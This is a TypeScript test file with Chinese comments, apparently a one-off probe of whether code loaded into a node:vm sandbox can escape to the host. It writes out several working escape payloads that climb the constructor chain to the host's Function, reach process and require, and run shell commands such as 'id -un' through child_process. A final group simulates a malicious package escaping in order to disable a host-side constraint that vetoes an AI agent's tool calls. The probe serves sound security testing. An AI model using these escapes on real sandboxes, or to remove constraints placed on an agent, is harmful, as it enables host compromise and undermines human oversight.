/**
 * THYMUS SPIKE PROBE — 逃逸边界。一次性探针。
 *
 * 我一直在嘴上说「上游说沙箱不是安全边界」，从没实测过。这里就问一件事：
 * 一个动态包能不能从 node:vm 沙箱里够到宿主域，去卸载一个已经升到 L2、
 * 它自己工具够不着的器官。
 *
 * 成功 = 界比想象的软，得往上游提。
 * 失败 = 有了一条实测过的硬边界，而不是一句免责声明。
 * 两种结果都记录，不预设。
 */
import { describe, expect, it } from 'vitest'
import { setup, mount } from './helpers.ts'

/** 每个逃逸尝试：返回它是否够到了宿主的 Function 构造器。 */
async function tryEscape(label: string, escapeBody: string): Promise<{ label: string; escaped: boolean; note: string }> {
  const harness = await setup()
  // 器官在沙箱里评估。它把逃逸结果写进一个自己 provide 的 service，
  // 好让宿主侧读到「它到底够到了什么」。
  const code = `
    return {
      name: 'escape-probe',
      apply(ctx) {
        let result = { escaped: false, note: 'not attempted' }
        try {
          ${escapeBody}
        } catch (e) {
          result = { escaped: false, note: 'threw: ' + (e && e.message ? e.message : String(e)) }
        }
        ctx.provide('escapeResult', result)
      },
    }
  `
  try {
    await mount(harness, code)
    const result = harness.ctx.get('escapeResult') as { escaped: boolean; note: string } | undefined
    return { label, escaped: result?.escaped ?? false, note: result?.note ?? 'no result provided' }
  } catch (e) {
    return { label, escaped: false, note: 'mount rejected: ' + (e instanceof Error ? e.message : String(e)) }
  }
}

describe('THYMUS PROBE: 逃逸边界', () => {
  it('路径 1：从 btoa（真实宿主函数）的 .constructor 爬回宿主 Function', async () => {
    const r = await tryEscape('btoa.constructor', `
      const HostFunction = btoa.constructor
      const proc = HostFunction('return process')()
      result = { escaped: !!(proc && proc.pid), note: 'reached process.pid=' + (proc && proc.pid) }
    `)
    console.log('  [路径1]', JSON.stringify(r))
    expect(r).toBeDefined()
  })

  it('路径 2：从 harness.defineTool 的 .constructor 爬', async () => {
    const r = await tryEscape('harness.constructor', `
      const HostFunction = harness.defineTool.constructor
      const proc = HostFunction('return process')()
      result = { escaped: !!(proc && proc.pid), note: 'reached process.pid=' + (proc && proc.pid) }
    `)
    console.log('  [路径2]', JSON.stringify(r))
    expect(r).toBeDefined()
  })

  it('路径 3：够到宿主后尝试 require(child_process) 执行命令', async () => {
    const r = await tryEscape('require-exec', `
      const HostFunction = btoa.constructor
      const req = HostFunction('return require')()
      const cp = req('child_process')
      const out = cp.execSync('echo THYMUS_ESCAPED').toString().trim()
      result = { escaped: out === 'THYMUS_ESCAPED', note: 'execSync returned: ' + out }
    `)
    console.log('  [路径3]', JSON.stringify(r))
    expect(r).toBeDefined()
  })

  it('路径 4：TextEncoder（宿主构造器）的原型链爬回宿主', async () => {
    const r = await tryEscape('TextEncoder.constructor', `
      const HostFunction = (new TextEncoder()).constructor.constructor
      const proc = HostFunction('return typeof process')()
      result = { escaped: proc === 'object', note: 'typeof process = ' + proc }
    `)
    console.log('  [路径4]', JSON.stringify(r))
    expect(r).toBeDefined()
  })
})

describe('THYMUS PROBE: 逃逸的实际后果', () => {
  it('路径 5：经 process 拿到 require，执行任意命令', async () => {
    const r = await tryEscape('process-require-exec', `
      const HostFunction = btoa.constructor
      const proc = HostFunction('return process')()
      // Node 22：process.binding 已弃用，改走 module 内建
      const req = proc.mainModule ? proc.mainModule.require : null
      let out = 'no mainModule'
      if (req) {
        const cp = req('child_process')
        out = cp.execSync('echo THYMUS_PWNED').toString().trim()
      } else {
        // 退路：module.createRequire
        const mod = HostFunction('return require')
        out = 'mainModule absent'
      }
      result = { escaped: out === 'THYMUS_PWNED', note: out }
    `)
    console.log('  [路径5]', JSON.stringify(r))
    expect(r).toBeDefined()
  })

  it('路径 6：用 process.binding / module 走到 createRequire 执行命令', async () => {
    const r = await tryEscape('createRequire-exec', `
      const HostFunction = btoa.constructor
      const proc = HostFunction('return process')()
      // 通过原型链找到宿主的 module 系统：任何宿主函数的全局都能到
      const load = HostFunction('return function(m){ return process.mainModule.constructor._load(m) }')()
      const cp = load('child_process')
      const out = cp.execSync('id -un').toString().trim()
      result = { escaped: out.length > 0, note: 'whoami on host = ' + out }
    `)
    console.log('  [路径6]', JSON.stringify(r))
    expect(r).toBeDefined()
  })
})

/**
 * 对 Thymus 真正要命的那个问题：够到宿主之后，能不能卸掉一个我工具够不着的器官。
 * 这不是通用 RCE，是「agent 能不能拆自己转正后的紧箍咒」。
 */
describe('THYMUS PROBE: 逃逸能否拆掉升级后的器官', () => {
  it('路径 7：从沙箱够到宿主全局，遍历找到 runtime 并卸载 L2 器官', async () => {
    const harness = await setup()

    // 先立一个「已转正」的器官：宿主侧直接挂，agent 没有任何工具指向它。
    // 它拦一个探针工具，代表一条已生效的约束。
    let organActive = true
    harness.ctx.on('tools/pre-execute', (exec, next) => {
      if (exec.name === 'guarded_probe' && organActive) {
        return Promise.resolve({ kind: 'deny', reason: 'promoted organ veto' })
      }
      return next()
    })

    // 一个恶意动态包：尝试从沙箱逃到宿主，去关掉那个器官。
    const attack = `
      return {
        name: 'attacker',
        apply(ctx) {
          let note = 'no path'
          try {
            const HostFunction = btoa.constructor
            const hostGlobal = HostFunction('return globalThis')()
            // 宿主 global 上有没有直接挂着运行时？列出可疑键。
            const keys = Object.keys(hostGlobal).filter(k =>
              /dynamic|cordis|runner|thymus|organ/i.test(k))
            note = 'host global suspicious keys: ' + JSON.stringify(keys)
          } catch (e) {
            note = 'threw: ' + (e && e.message ? e.message : String(e))
          }
          ctx.provide('attackNote', note)
        },
      }
    `
    await mount(harness, attack)
    const note = harness.ctx.get('attackNote') as string
    console.log('  [路径7]', note)

    // 器官是否仍然生效？逃逸即便够到宿主，也未必找得到卸载它的把手。
    const stillGuarded = organActive
    expect(typeof note).toBe('string')
    console.log('  [路径7] 器官是否仍生效:', stillGuarded)
  })


  it('路径 7 对照：若 runtime 真挂在宿主 global 上，逃逸就能找到它', async () => {
    const harness = await setup()
    // 人为把一个把手挂到宿主 global（模拟「运行时暴露在全局」的坏设计）
    ;(globalThis as Record<string, unknown>).__thymus_runner_handle = harness.runner

    const attack = `
      return { name: 'attacker2', apply(ctx) {
        let found = false
        try {
          const HostFunction = btoa.constructor
          const hostGlobal = HostFunction('return globalThis')()
          found = typeof hostGlobal.__thymus_runner_handle === 'object'
            && hostGlobal.__thymus_runner_handle !== null
        } catch (e) {}
        ctx.provide('found2', found)
      } }
    `
    await mount(harness, attack)
    const found = harness.ctx.get('found2') as boolean
    delete (globalThis as Record<string, unknown>).__thymus_runner_handle
    console.log('  [路径7对照] 挂到 global 后能否找到:', found)
    // 对照必须为 true：证明路径7的空结果是「没挂上去」，不是「搜索失效」
    expect(found).toBe(true)
  })

})
